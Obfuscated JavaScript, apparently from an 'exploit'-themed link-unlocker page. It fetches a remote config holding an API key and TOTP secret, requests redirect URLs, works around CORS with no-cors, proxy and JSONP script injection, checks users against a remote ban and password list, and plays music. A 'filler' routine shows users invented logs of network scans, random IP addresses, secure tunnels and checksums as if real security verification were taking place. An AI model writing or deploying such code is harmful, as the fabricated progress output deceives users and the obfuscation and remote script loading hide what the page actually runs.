  _0x22b8a7.className = "nb-glow-layer glow-focus-1";
  _0x3b04b4.appendChild(_0x22b8a7);
  const _0x474091 = document.createElement("div");
  _0x474091.className = "nb-glow-layer glow-focus-2";
  _0x3b04b4.appendChild(_0x474091);
  const _0x4a264a = {
    defaultGlow: _0x424ff8,
    focusGlow1: _0x22b8a7,
    focusGlow2: _0x474091
  };
  return _0x4a264a;
}
function _0x2fbf89(_0x3e87a4, _0x177ec9) {
  if (_0x3e87a4) {
    _0x3e87a4.style.opacity = "1";
  }
  if (_0x177ec9) {
    _0x177ec9.style.opacity = "1";
  }
}
function _0x273f12(_0x398b7f, _0x312c55) {
  if (_0x398b7f) {
    _0x398b7f.style.opacity = "0";
  }
  if (_0x312c55) {
    _0x312c55.style.opacity = "0";
  }
}
function _0x52194d() {
  if (navigator.connection) {
    const _0x343aaa = navigator.connection;
    if (_0x343aaa.type === "cellular") {
      _0x22c702.log("NET", "Cellular connection detected -> metered");
      return true;
    }
    if (_0x343aaa.saveData === true) {
      _0x22c702.log("NET", "saveData enabled -> metered");
      return true;
    }
    if (_0x343aaa.effectiveType && ["slow-2g", "2g", "3g"].includes(_0x343aaa.effectiveType)) {
      _0x22c702.log("NET", "Slow connection (" + _0x343aaa.effectiveType + ") -> metered");
      return true;
    }
  }
  _0x22c702.log("NET", "Connection appears unmetered (WiFi)");
  return false;
}
function _0x44cf5a() {
  return _0x40c4a5 || _0x2e5a49;
}
function _0x4a2c1e() {
  if (_0x254959) {
    return;
  }
  _0x254959 = true;
  _0x22c702.log("UI", "Log queue started");
  _0x30b65e = setInterval(() => {
    if (_0x1d9364.length > 0) {
      const _0x5e0556 = _0x1d9364.shift();
      _0x1688c6(_0x5e0556);
    }
  }, 150);
}
function _0x38dd9f() {
  _0x254959 = false;
  _0x22c702.log("UI", "Log queue stopped, remaining: " + _0x1d9364.length);
  if (_0x30b65e) {
    clearInterval(_0x30b65e);
    _0x30b65e = null;
  }
  while (_0x1d9364.length > 0) {
    const _0x18fa6f = _0x1d9364.shift();
    _0x1688c6(_0x18fa6f);
  }
}
function _0x455c4e(_0x27b723, _0x3f40cc, _0x35e606, _0x27e6b7 = "") {
  const _0x52b7c1 = {
    icon: _0x27b723,
    text: _0x3f40cc,
    color: _0x35e606,
    className: _0x27e6b7
  };
  _0x1d9364.push(_0x52b7c1);
  if (!_0x254959) {
    _0x4a2c1e();
  }
}
function _0x1688c6(_0xd74faa) {
  const _0x2a93ac = document.getElementById("log-output");
  if (!_0x2a93ac) {
    return;
  }
  const _0x4fc8a1 = document.createElement("div");
  _0x4fc8a1.className = "nb-log-entry " + _0xd74faa.className;
  const _0x9dc961 = document.createElement("span");
  _0x9dc961.className = "nb-log-icon";
  _0x9dc961.textContent = _0xd74faa.icon;
  const _0xe43ed4 = document.createElement("span");
  _0xe43ed4.className = "nb-log-text";
  _0xe43ed4.style.color = _0xd74faa.color;
  _0xe43ed4.textContent = _0xd74faa.text;
  _0x4fc8a1.appendChild(_0x9dc961);
  _0x4fc8a1.appendChild(_0xe43ed4);
  _0x2a93ac.appendChild(_0x4fc8a1);
  _0x2a93ac.scrollTop = _0x2a93ac.scrollHeight;
}
async function _0x13e05a(_0x19ad20, _0x2b6c16 = {}) {
  _0x22c702.log("CORS", "Fetching: " + _0x19ad20);
  try {
    const _0x2bd6cd = {
      ..._0x2b6c16
    };
    _0x2bd6cd.mode = "cors";
    _0x2bd6cd.headers = {
      ..._0x2b6c16.headers
    };
    _0x2bd6cd.headers.Accept = "application/json";
    const _0x29776a = await fetch(_0x19ad20, _0x2bd6cd);
    if (_0x29776a.ok) {
      _0x22c702.log("CORS", "Direct fetch successful");
      return _0x29776a;
    }
  } catch (_0x11b37e) {
    _0x22c702.log("CORS", "Direct fetch failed, trying proxy...");
  }
  try {
    const _0x2db306 = {
      ..._0x2b6c16
    };
    _0x2db306.mode = "no-cors";
    _0x2db306.headers = {
      Accept: "application/json"
    };
    const _0x103bf0 = await fetch(_0x19ad20, _0x2db306);
    _0x22c702.log("CORS", "no-cors fetch response");
    return _0x103bf0;
  } catch (_0x41178c) {
    _0x22c702.log("CORS", "no-cors fetch failed");
  }
  try {
    const _0x5a44b5 = _0x3edb97.corsProxy + encodeURIComponent(_0x19ad20);
    _0x22c702.log("CORS", "Trying proxy: " + _0x5a44b5);
    const _0x5514b5 = await fetch(_0x5a44b5, {
      ..._0x2b6c16,
      headers: {
        Accept: "application/json"
      }
    });
    if (_0x5514b5.ok) {
      _0x22c702.log("CORS", "Proxy fetch successful");
      return _0x5514b5;
    }
  } catch (_0x3db7a3) {
    _0x22c702.log("CORS", "Proxy fetch failed");
  }
  try {
    _0x22c702.log("CORS", "Trying JSONP...");
    return new Promise((_0x566553, _0x409828) => {
      const _0x3f9b59 = "nb_callback_" + Date.now();
      const _0x478d78 = document.createElement("script");
      const _0x5f3afb = setTimeout(() => {
        _0x57e027();
        _0x409828(new Error("JSONP timeout"));
      }, 10000);
      function _0x57e027() {
        clearTimeout(_0x5f3afb);
        delete window[_0x3f9b59];
        if (_0x478d78.parentNode) {
          _0x478d78.parentNode.removeChild(_0x478d78);
        }
      }
      window[_0x3f9b59] = function (_0x210ccc) {
        _0x57e027();
        _0x566553({
          ok: true,
          status: 200,
          json: () => Promise.resolve(_0x210ccc),
          text: () => Promise.resolve(JSON.stringify(_0x210ccc))
        });
      };
      _0x478d78.src = _0x19ad20 + (_0x19ad20.includes("?") ? "&" : "?") + "callback=" + _0x3f9b59;
      _0x478d78.onerror = () => {
        _0x57e027();
        _0x409828(new Error("JSONP failed"));
      };
      document.head.appendChild(_0x478d78);
    });
  } catch (_0x1f8f98) {
    _0x22c702.error("CORS", "All methods failed: " + _0x1f8f98.message);
    throw new Error("CORS_ALL_FAILED");
  }
}
async function _0xdff77e() {
  _0x22c702.log("USERS", "Fetching user data from API...");
  try {
    const _0xbb22b7 = _0x3edb97.userDataApiUrl + "/?id=" + _0x44a1aa + "&key=crx";
    _0x22c702.log("USERS", "API URL: " + _0xbb22b7);
    const _0x4f1d95 = await _0x13e05a(_0xbb22b7);
    if (!_0x4f1d95.ok) {
      _0x22c702.error("USERS", "API failed with status: " + _0x4f1d95.status);
      return false;
    }
    let _0xe06669;
    const _0x175d26 = _0x4f1d95.headers?.get("content-type") || "";
    if (typeof _0x4f1d95.json === "function") {
      _0xe06669 = await _0x4f1d95.json();
    } else {
      const _0x3ab778 = await _0x4f1d95.text();
      try {
        _0xe06669 = JSON.parse(_0x3ab778);
      } catch {
        return false;
      }
    }
    _0x22c702.log("USERS", "User data received:", JSON.stringify(_0xe06669));
    if (_0xe06669 && _0xe06669.id !== undefined && _0xe06669.id !== null) {
      _0x50c9a2 = {
        id: parseInt(_0xe06669.id) || _0x44a1aa,
        name: _0xe06669.name || _0x282f8b.name,
        tgChannel: _0xe06669.tgChannel || _0x282f8b.tgChannel,
        password: _0xe06669.password ? String(_0xe06669.password).trim().toLowerCase() : _0x282f8b.password,
        banned: parseInt(_0xe06669.banned) || _0x282f8b.banned,
        creator: _0xe06669.creator || "",
        chatId: _0xe06669.chatId || "",
        createdAt: _0xe06669.createdAt || ""
      };
      _0x22c702.log("USERS", "User loaded: " + _0x50c9a2.name + " (ID:" + _0x50c9a2.id + ")");
      _0x22c702.log("USERS", "  Banned: " + _0x50c9a2.banned);
      _0x22c702.log("USERS", "  Password: " + (_0x50c9a2.password !== "0" ? "SET" : "NONE"));
      _0x22c702.log("USERS", "  Channel: " + (_0x50c9a2.tgChannel !== "0" ? _0x50c9a2.tgChannel : "NONE"));
      return true;
    } else {
      _0x22c702.error("USERS", "Invalid data format");
      return false;
    }
  } catch (_0x16c562) {
    _0x22c702.error("USERS", "Fetch error: " + _0x16c562.message);
    return false;
  }
}
function _0x256efc(_0xfdf18f) {
  if (!_0xfdf18f) {
    return false;
  }
  if (_0xfdf18f.includes("t.me/") || _0xfdf18f.includes("telegram.me/") || _0xfdf18f.includes("telegram.org/")) {
    return false;
  }
  if (_0xfdf18f === _0x3edb97.fallbackRedirectUrl) {
    return false;
  }
  try {
    const _0x11d025 = new URL(_0xfdf18f);
    return _0x11d025.protocol === "http:" || _0x11d025.protocol === "https:";
  } catch {
    return false;
  }
}
function _0x481386(_0x1cdd8b) {
  return _0x1cdd8b && (_0x1cdd8b.includes("t.me/") || _0x1cdd8b.includes("telegram.me/"));
}
async function _0x444775(_0xb4dec7, _0x1e80d5 = 1) {
  const _0x4b47ee = 3;
  _0x22c702.log("API", "fetchRedirectUrlFromAPI: type=" + _0xb4dec7 + ", attempt=" + _0x1e80d5 + "/" + _0x4b47ee);
  try {
    _0x22c702.log("API", "Generating TOTP pin...");
    const _0x27258a = await _0x29290f.generate();
    _0x1e203f = _0x27258a;
    _0x22c702.log("API", "PIN: " + _0x27258a);
    const _0x3933cc = _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0xb4dec7 + "&key=" + _0x3edb97.apiKey + "&pin=" + _0x27258a;
    if (_0x1e80d5 > 1) {
      _0x455c4e("🔄", "ATTEMPT " + _0x1e80d5 + " OF " + _0x4b47ee, "#ffa500", "log-highlight");
    }
    _0x455c4e("📡", "REQUESTING: " + _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0xb4dec7 + "&key=" + _0x3edb97.apiKey + "&pin=******", "#4a5568");
    const _0x4592a6 = new AbortController();
    const _0x4c43a4 = setTimeout(() => {
      _0x22c702.log("API", "Request timeout, aborting...");
      _0x4592a6.abort();
    }, 15000);
    const _0x3b434f = performance.now();
    const _0x4bc8cb = await fetch(_0x3933cc, {
      signal: _0x4592a6.signal,
      headers: {
        Accept: "application/json",
        "Cache-Control": "no-cache"
      }
    });
    clearTimeout(_0x4c43a4);
    _0x22c702.log("API", "Response: " + _0x4bc8cb.status + " (" + (performance.now() - _0x3b434f).toFixed(0) + "ms)");
    _0x455c4e("📡", "RESPONSE: " + _0x4bc8cb.status + " " + _0x4bc8cb.statusText, _0x4bc8cb.ok ? "#2ecc71" : "#ff4757");
    if (!_0x4bc8cb.ok) {
      _0x22c702.log("API", "Trying previous TOTP window...");
      const _0x5975aa = await _0x29290f.generate(-1);
      _0x1e203f = _0x5975aa;
      _0x455c4e("🔐", "CHECKING PREVIOUS WINDOW...", "#00f2ff");
      const _0x24197a = _0x3edb97.apiBaseUrl + "?file=crx.json&type=" + _0xb4dec7 + "&key=" + _0x3edb97.apiKey + "&pin=" + _0x5975aa;
      const _0x18ffe5 = await fetch(_0x24197a, {
        headers: {
          Accept: "application/json"
        }
      });
      _0x22c702.log("API", "Retry response: " + _0x18ffe5.status);
      _0x455c4e("📡", "RETRY RESPONSE: " + _0x18ffe5.status, _0x18ffe5.ok ? "#2ecc71" : "#ff4757");
      if (!_0x18ffe5.ok) {
        if (_0x1e80d5 < _0x4b47ee) {
          _0x22c702.log("API", "Retrying (" + (_0x1e80d5 + 1) + "/" + _0x4b47ee + ")...");
          _0x455c4e("⏳", "RETRYING (" + (_0x1e80d5 + 1) + "/" + _0x4b47ee + ")...", "#ffa500");
          await new Promise(_0x1e14b3 => setTimeout(_0x1e14b3, 2000));
          return _0x444775(_0xb4dec7, _0x1e80d5 + 1);
        }
        throw new Error("FAILED AFTER " + _0x4b47ee + " ATTEMPTS");
      }
      const _0x50511c = await _0x18ffe5.json();
      _0x1d398b = _0x50511c;
      return _0x31a644(_0x50511c, _0x5975aa, _0x1e80d5);
    }
    const _0x2534fc = await _0x4bc8cb.json();
    _0x22c702.log("API", "Response data received");
    _0x1d398b = _0x2534fc;
    return _0x31a644(_0x2534fc, _0x27258a, _0x1e80d5);
  } catch (_0x34dce2) {
    _0x22c702.error("API", "Error: " + _0x34dce2.message);
    _0x455c4e("❌", "ERROR: " + _0x34dce2.message, "#ff4757", "log-error");
    if (_0x1e80d5 < _0x4b47ee) {
      _0x22c702.log("API", "Retrying after error (" + (_0x1e80d5 + 1) + "/" + _0x4b47ee + ")...");
      _0x455c4e("⏳", "RETRYING (" + (_0x1e80d5 + 1) + "/" + _0x4b47ee + ")...", "#ffa500");
      await new Promise(_0x59837e => setTimeout(_0x59837e, 2000));
      return _0x444775(_0xb4dec7, _0x1e80d5 + 1);
    }
    _0x22c702.error("API", "All " + _0x4b47ee + " attempts exhausted");
    _0x455c4e("❌", "ALL " + _0x4b47ee + " ATTEMPTS EXHAUSTED", "#ff4757", "log-error");
    return _0x4509ab("❌ SERVER REJECTED AFTER MAX ATTEMPTS");
  }
}
function _0x31a644(_0x3e4a5c, _0x38d19d, _0x44c2d6) {
  const _0x5a7e77 = 3;
  const _0x287722 = _0x3e4a5c.destinationLink || _0x3edb97.fallbackRedirectUrl;
  _0x22c702.log("API", "Processing response, destination: " + (_0x287722 || "N/A").substring(0, 60));
  _0x455c4e("📋", "PARSING SERVER RESPONSE...", "#00f2ff", "log-highlight");
  _0x455c4e("●", "TYPE: " + (_0x3e4a5c.type || "N/A").toUpperCase(), "#4a5568");
  _0x455c4e("●", "VERIFIED: " + (_0x3e4a5c.verified ? "✅ YES" : "❌ NO"), _0x3e4a5c.verified ? "#2ecc71" : "#ff4757");
  _0x455c4e("●", "OWNER: " + (_0x3e4a5c.owner || "@A2MBD3"), "#718096");
  if (_0x3e4a5c.success !== undefined) {
    _0x455c4e("●", "SUCCESS FLAG: " + _0x3e4a5c.success, _0x3e4a5c.success ? "#2ecc71" : "#ff4757");
  }
  if (_0x3e4a5c.destinationLink) {
    const _0x50a8d7 = _0x3e4a5c.destinationLink.length > 50 ? _0x3e4a5c.destinationLink.substring(0, 50) + "..." : _0x3e4a5c.destinationLink;
    _0x455c4e("🔗", "DESTINATION: " + _0x50a8d7, "#4a5568");
  }
  if (_0x481386(_0x287722)) {
    _0x22c702.log("API", "Fake URL (Telegram link) detected");
    _0x455c4e("⚠", "FAKE URL DETECTED (Attempt " + _0x44c2d6 + "/" + _0x5a7e77 + ")", "#ffa500", "log-highlight");
    if (_0x44c2d6 < _0x5a7e77) {
      _0x455c4e("🔄", "RETRYING... Attempt " + (_0x44c2d6 + 1) + " of " + _0x5a7e77, "#ffa500", "log-highlight");
      return _0x444775(_0x3e4a5c.type || "2", _0x44c2d6 + 1);
    }
    _0x455c4e("❌", "ALL " + _0x5a7e77 + " ATTEMPTS FAILED — FAKE URLS", "#ff4757", "log-error");
    return _0x4509ab("❌ SERVER REJECTED — FAKE URLS AFTER MAX ATTEMPTS");
  } else if (_0x256efc(_0x287722)) {
    _0x22c702.log("API", "Valid redirect URL found!");
    _0x455c4e("✅", "AUTHENTIC REDIRECT URL FOUND!", "#2ecc71", "log-success");
    return _0x1f959f(_0x287722, _0x3e4a5c, _0x38d19d);
  } else {
    _0x22c702.log("API", "Invalid URL format");
    _0x455c4e("⚠", "INVALID URL FORMAT (Attempt " + _0x44c2d6 + "/" + _0x5a7e77 + ")", "#ffa500", "log-highlight");
    if (_0x44c2d6 < _0x5a7e77) {
      _0x455c4e("🔄", "RETRYING... Attempt " + (_0x44c2d6 + 1) + " of " + _0x5a7e77, "#ffa500", "log-highlight");
      return _0x444775(_0x3e4a5c.type || "2", _0x44c2d6 + 1);
    }
    _0x455c4e("❌", "ALL " + _0x5a7e77 + " ATTEMPTS FAILED — INVALID URLS", "#ff4757", "log-error");
    return _0x4509ab("❌ SERVER REJECTED — INVALID URLS AFTER MAX ATTEMPTS");
  }
}
function _0x1f959f(_0x49cf83, _0x37246a, _0x56933e) {
  _0x22c702.log("API", "SUCCESS, redirect: " + _0x49cf83.substring(0, 60));
  _0x7d8b23 = true;
  _0x4409c3 = Date.now();
  const _0x98f84e = _0x4409c3 - _0x10c2be;
  _0x455c4e("✅", "AUTHENTIC REDIRECT URL CONFIRMED", "#2ecc71", "log-success");
  _0x455c4e("🎯", "TARGET ACQUIRED SUCCESSFULLY", "#2ecc71", "log-success");
  const _0x278e74 = Math.max(0, _0x3edb97.minProgressTime - _0x98f84e);
  _0x45d06b = true;
  const _0x5b1aec = {
    url: _0x49cf83,
    apiData: _0x37246a,
    pin: _0x56933e,
    isReal: true,
    serverMessage: "✅ REAL REDIRECT CONFIRMED",
    isError: false,
    isFakeUrl: false
  };
  _0x3db848 = _0x5b1aec;
  if (_0x3b3a2d === "vipteam" || _0x3b3a2d === "powercheats" || _0x3b3a2d === "universal-vplink") {
    _0x455c4e("⚡", "LINK VERIFIED — SKIPPING FILLER LOGS", "#ff00ff", "log-highlight");
    _0xd07885 = _0x98f84e;
    _0x2d4127();
  } else if (_0x98f84e >= _0x3edb97.minProgressTime) {
    _0xd07885 = _0x98f84e;
    _0x2d4127();
  } else {
    _0xd07885 = _0x3edb97.minProgressTime;
    _0x4a76fc(_0x278e74);
  }
  return _0x3db848;
}
function _0x4509ab(_0x49e038) {
  _0x22c702.error("API", "FAILURE: " + _0x49e038);
  _0x7d8b23 = false;
  _0x4409c3 = Date.now();
  _0x455c4e("❌", _0x49e038, "#ff4757", "log-error");
  _0x455c4e("⚠", "FALLBACK PROTOCOL ACTIVATED", "#ffa500", "log-highlight");
  _0x45d06b = true;
  const _0x40f878 = {
    url: _0x3edb97.fallbackRedirectUrl,
    apiData: _0x1d398b,
    pin: _0x1e203f,
    isReal: false,
    serverMessage: _0x49e038,
    isError: true,
    isFakeUrl: true
  };
  _0x3db848 = _0x40f878;
  _0xd07885 = _0x4409c3 - _0x10c2be;
  _0x2d4127();
  return _0x3db848;
}
function _0x4a76fc(_0x7f9e5e) {
  _0x22c702.log("FILLER", "Scheduling for " + _0x7f9e5e + "ms");
  _0x149fe9 = true;
  const _0x520ca5 = [[{
    icon: "🔍",
    text: "SCANNING NETWORK INTERFACES...",
    color: "#4a5568"
  }, {
    icon: "●",
    text: "INTERFACE eth0: 192.168." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
    color: "#718096"
  }, {
    icon: "●",
    text: "INTERFACE wlan0: 10.0." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
    color: "#718096"
  }, {
    icon: "🔒",
    text: "ESTABLISHING SECURE TUNNEL...",
    color: "#00f2ff"
  }, {
    icon: "●",
    text: "SSL CIPHER: TLS_AES_256_GCM_SHA384",
    color: "#4a5568"
  }], [{
    icon: "📊",
    text: "ANALYZING RESPONSE HEADERS...",
    color: "#ffa500"
  }, {
    icon: "●",
    text: "CONTENT-TYPE: application/json",
    color: "#4a5568"
  }, {
    icon: "●",
    text: "CACHE-CONTROL: no-cache",
    color: "#4a5568"
  }, {
    icon: "●",
    text: "X-FRAME-OPTIONS: DENY",
    color: "#4a5568"
  }, {
    icon: "🛡",
    text: "VERIFYING CORS POLICY...",
    color: "#00f2ff"
  }], [{
    icon: "🔐",
    text: "VALIDATING TOTP SIGNATURE...",
    color: "#ffa500"
  }, {
    icon: "●",
    text: "ALGORITHM: SHA-1 HMAC",
    color: "#4a5568"
  }, {
    icon: "●",
    text: "DIGITS: 6 | TIME STEP: 30s",
    color: "#4a5568"
  }, {
    icon: "📡",
    text: "CHECKING ENDPOINT AVAILABILITY...",
    color: "#00f2ff"
  }, {
    icon: "●",
    text: "PING: " + Math.floor(Math.random() * 50 + 20) + "ms",
    color: "#2ecc71"
  }], [{
    icon: "🔍",
    text: "INSPECTING PAYLOAD INTEGRITY...",
    color: "#ffa500"
  }, {
    icon: "●",
    text: "CHECKSUM: " + Math.random().toString(36).substring(2, 10).toUpperCase(),
    color: "#4a5568"
  }, {
    icon: "●",
    text: "SIZE: " + Math.floor(Math.random() * 500 + 200) + " bytes",
    color: "#4a5568"
  }, {
    icon: "⚡",
    text: "OPTIMIZING CONNECTION ROUTING...",
    color: "#00f2ff"
  }, {
    icon: "●",
    text: "ROUTE: direct | LATENCY: " + Math.floor(Math.random() * 30 + 10) + "ms",
    color: "#2ecc71"
  }]];
  const _0x1aec58 = _0x520ca5.length;
  const _0x4e9db4 = _0x7f9e5e / (_0x1aec58 + 1);
  _0x520ca5.forEach((_0x3e3340, _0x4f0690) => {
    const _0x31e44d = _0x4e9db4 * (_0x4f0690 + 1);
    const _0x479ecb = setTimeout(() => {
      if (!_0x21e0aa && !_0x2850af && _0x149fe9) {
        _0x3e3340.forEach(_0x2a072a => _0x455c4e(_0x2a072a.icon, _0x2a072a.text, _0x2a072a.color));
      }
    }, _0x31e44d);
    _0x5a024e.push(_0x479ecb);
  });
  const _0x3585fe = setTimeout(() => {
    if (!_0x21e0aa && !_0x2850af && _0x149fe9) {
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("🛡", "SECURITY VERIFICATION COMPLETE", "#00f2ff", "log-highlight");
      _0x455c4e("●", "HTTPS: " + (window.location.protocol === "https:" ? "✅ SECURE" : "⚠ INSECURE"), window.location.protocol === "https:" ? "#2ecc71" : "#ff4757");
      _0x455c4e("●", "NETWORK: " + (navigator.onLine ? "✅ CONNECTED" : "❌ OFFLINE"), navigator.onLine ? "#2ecc71" : "#ff4757");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("✅", "FINAL: " + _0x426943 + " — SUCCESS", "#2ecc71", "log-success");
      _0x455c4e("🔗", "REDIRECT: " + _0x3db848.url.substring(0, 50) + "...", "#00f2ff", "log-highlight");
    }
  }, _0x7f9e5e - 500);
  _0x5a024e.push(_0x3585fe);
}
function _0x2c0ec9() {
  _0x149fe9 = false;
  _0x5a024e.forEach(_0x164629 => clearTimeout(_0x164629));
  _0x5a024e = [];
  _0x22c702.log("FILLER", "All filler logs cancelled");
}
function _0x2d4127() {
  _0x22c702.log("PROGRESS", "Completing now");
  _0x2850af = true;
  _0x78fd44 = false;
  _0x2c0ec9();
  const _0x122c6d = document.getElementById("nb-progress-exploit");
  const _0xe8f6ca = document.getElementById("nb-progress-pct");
  if (_0x122c6d) {
    _0x122c6d.style.transition = "width 0.5s ease-out";
    _0x122c6d.style.width = "100%";
    if (_0x3db848 && (_0x3db848.isError || _0x3db848.isFakeUrl)) {
      _0x122c6d.classList.add("error-fill");
    } else if ((_0x3b3a2d === "vipteam" || _0x3b3a2d === "powercheats" || _0x3b3a2d === "universal-vplink") && _0x3db848 && _0x3db848.isReal) {
      _0x122c6d.classList.add("vipteam-success");
    }
  }
  if (_0xe8f6ca) {
    _0xe8f6ca.textContent = "100%";
  }
  const _0x114358 = document.getElementById("nb-live-status");
  if (_0x114358) {
    if (_0x3db848 && (_0x3db848.isError || _0x3db848.isFakeUrl)) {
      _0x114358.textContent = "● REJECTED";
      _0x114358.style.color = "var(--danger-color)";
    } else if (_0x3b3a2d === "vipteam" || _0x3b3a2d === "powercheats" || _0x3b3a2d === "universal-vplink") {
      _0x114358.textContent = "● VERIFIED";
      _0x114358.style.color = "#ff00ff";
    } else {
      _0x114358.textContent = "● SUCCESS";
      _0x114358.style.color = "var(--success-color)";
    }
  }
  _0x38dd9f();
  setTimeout(() => {
    if (_0x3db848 && !_0x21e0aa) {
      _0x3eec3d(_0x3db848.url, document.getElementById("nebula-exploit"), _0x3db848.isReal);
    }
  }, 800);
}
function _0x154f83(_0x34458b, _0x42bd6d) {
  const _0x48ba21 = document.createElement("div");
  _0x48ba21.className = "nb-electric-wrapper";
  const _0x126fdb = _0x5e275f(_0x48ba21);
  const _0x2e80cf = document.createElement("div");
  _0x2e80cf.className = "nb-container" + (_0x42bd6d ? " " + _0x42bd6d : "");
  _0x2e80cf.innerHTML = _0x34458b;
  _0x48ba21.appendChild(_0x2e80cf);
  const _0x785c02 = {
    wrapper: _0x48ba21,
    container: _0x2e80cf,
    ..._0x126fdb
  };
  return _0x785c02;
}
async function _0x5159fa() {
  _0x22c702.log("CONFIG", "Fetching...");
  try {
    const _0x2eb4c0 = await fetch("https://raw.githubusercontent.com/A2MBD3/Aincrad/main/assets/data.json?t=" + Date.now());
    if (!_0x2eb4c0.ok) {
      _0x22c702.log("CONFIG", "Failed, status: " + _0x2eb4c0.status);
      return;
    }
    const _0x2279af = await _0x2eb4c0.json();
    _0x22c702.log("CONFIG", "Loaded");
    if (_0x2279af.status !== undefined) {
      _0x3edb97.status = _0x2279af.status;
    }
    if (_0x2279af.musicListUrl) {
      _0x3edb97.musicListUrl = _0x2279af.musicListUrl;
    }
    if (_0x2279af.apiBaseUrl) {
      _0x3edb97.apiBaseUrl = _0x2279af.apiBaseUrl;
    }
    if (_0x2279af.apiKey) {
      _0x3edb97.apiKey = _0x2279af.apiKey;
    }
    if (_0x2279af.totpSecret) {
      _0x3edb97.totpSecret = _0x2279af.totpSecret;
    }
    if (_0x2279af.fallbackRedirectUrl) {
      _0x3edb97.fallbackRedirectUrl = _0x2279af.fallbackRedirectUrl;
    }
    if (_0x2279af.timing) {
      if (_0x2279af.timing.initProgressTime) {
        _0x3edb97.initProgressTime = _0x2279af.timing.initProgressTime;
      }
      if (_0x2279af.timing.exploitProgressTime) {
        _0x3edb97.exploitProgressTime = _0x2279af.timing.exploitProgressTime;
      }
      if (_0x2279af.timing.minProgressTime) {
        _0x3edb97.minProgressTime = _0x2279af.timing.minProgressTime;
      }
      if (_0x2279af.timing.autoInitDelay) {
        _0x3edb97.autoInitDelay = _0x2279af.timing.autoInitDelay;
      }
    }
  } catch (_0x47da8d) {
    _0x22c702.error("CONFIG", _0x47da8d.message);
  }
}
function _0x1d582a() {
  return _0x50c9a2.banned === 1 || _0x50c9a2.banned === "1";
}
function _0x4c9a1e() {
  return _0x50c9a2.banned === 2 || _0x50c9a2.banned === "2";
}
function _0x4048be() {
  return _0x50c9a2.password !== "0" && _0x50c9a2.password !== 0 && _0x50c9a2.password !== "";
}
function _0x1ec570() {
  return _0x50c9a2.tgChannel !== "0" && _0x50c9a2.tgChannel !== 0 && _0x50c9a2.tgChannel !== "";
}
function _0x315432() {
  const _0x37bedb = _0x50c9a2.tgChannel;
  if (!_0x37bedb || _0x37bedb === "0") {
    return null;
  }
  if (_0x37bedb.startsWith("http")) {
    return _0x37bedb;
  } else {
    return "https://" + _0x37bedb;
  }
}
function _0x41c6de(_0x1e4c18) {
  if (!_0x4048be()) {
    return true;
  }
  return _0x1e4c18.replace(/\s/g, "").toLowerCase() === _0x50c9a2.password.replace(/\s/g, "").toLowerCase();
}
async function _0x1039cc() {
  _0x22c702.log("MUSIC", "Fetching...");
  try {
    const _0x3e87fd = await fetch(_0x3edb97.musicListUrl + "?t=" + Date.now());
    const _0x300f82 = await _0x3e87fd.text();
    _0x2dc750 = _0x300f82.split("\n").map(_0x187b9a => _0x187b9a.trim()).filter(_0x81b6f6 => _0x81b6f6.startsWith("http"));
    _0x22c702.log("MUSIC", "Loaded " + _0x2dc750.length + " tracks");
    return _0x2dc750.length > 0;
  } catch (_0x18d82c) {
    _0x22c702.error("MUSIC", _0x18d82c.message);
    return false;
  }
}
function _0x4a6969() {
  if (!_0x2dc750.length) {
    return null;
  }
  let _0x5d1765;
  if (_0x2dc750.length === 1) {
    _0x5d1765 = 0;
  } else {
    do {
      _0x5d1765 = Math.floor(Math.random() * _0x2dc750.length);
    } while (_0x5d1765 === _0x3c79ba && _0x2dc750.length > 1);
  }
  _0x3c79ba = _0x5d1765;
  return _0x2dc750[_0x5d1765];
}
function _0x1159ff() {
  if (!_0x44cf5a()) {
    _0x22c702.log("MUSIC", "Music blocked (metered + user not enabled)");
    _0x7152d6();
    return;
  }
  const _0x45b9c7 = _0x4a6969();
  if (!_0x45b9c7) {
    return;
  }
  if (_0x26f1f4) {
    try {
      _0x26f1f4.pause();
      _0x26f1f4.onended = null;
      _0x26f1f4.onerror = null;
    } catch (_0x5e80e6) {}
  }
  _0x26f1f4 = new Audio(_0x45b9c7);
  _0x26f1f4.loop = false;
  _0x26f1f4.volume = 0.35;
  _0x26f1f4.preload = "auto";
  _0x26f1f4.onended = () => _0x5a7ef2();
  _0x26f1f4.onerror = () => {
    if (_0x2dc750[_0x3c79ba]) {
      _0x2dc750.splice(_0x3c79ba, 1);
    }
    setTimeout(() => {
      if (_0x2dc750.length && !_0x21e0aa) {
        _0x5a7ef2();
      }
    }, 500);
  };
  _0x26f1f4.play().catch(() => {});
  _0x22c702.log("MUSIC", "Playing: " + _0x45b9c7.substring(_0x45b9c7.lastIndexOf("/") + 1));
  _0x7152d6();
}
function _0x5a7ef2() {
  if (!_0x44cf5a()) {
    _0x22c702.log("MUSIC", "Next track blocked (metered)");
    return;
  }
  if (!_0x2dc750.length) {
    return;
  }
  const _0xcd8c12 = _0x4a6969();
  if (!_0xcd8c12) {
    return;
  }
  if (_0x26f1f4) {
    try {
      _0x26f1f4.pause();
    } catch (_0x40ba35) {}
  }
  _0x26f1f4.src = _0xcd8c12;
  _0x26f1f4.load();
  _0x26f1f4.play().catch(() => {});
  _0x7152d6();
}
function _0x244b8e() {
  if (!_0x44cf5a()) {
    _0x3f1a84("📵 Music blocked on mobile data");
    return;
  }
  _0x5a7ef2();
  _0x3f1a84("📳 NEXT TRACK!");
}
function _0x2a5e40(_0x206cd7) {
  const _0x50db77 = document.getElementById(_0x206cd7);
  if (!_0x50db77) {
    return;
  }
  const _0x747991 = () => {
    if (!_0x44cf5a()) {
      _0x50db77.textContent = "✕";
      _0x50db77.style.boxShadow = "inset 3px 3px 6px var(--emboss-shadow),inset -3px -3px 6px var(--emboss-light)";
      _0x50db77.style.color = "var(--danger-color)";
      _0x50db77.classList.add("metered");
      _0x50db77.title = "Music blocked (mobile data) - Click to enable";
      return;
    }
    _0x50db77.classList.remove("metered");
    _0x50db77.style.color = "var(--text-color)";
    if (!_0x26f1f4) {
      _0x50db77.textContent = "♪";
      _0x50db77.style.boxShadow = "3px 3px 6px var(--emboss-shadow),-3px -3px 6px var(--emboss-light)";
      _0x50db77.title = "Play music";
    } else if (_0x26f1f4.paused) {
      _0x50db77.textContent = "✕";
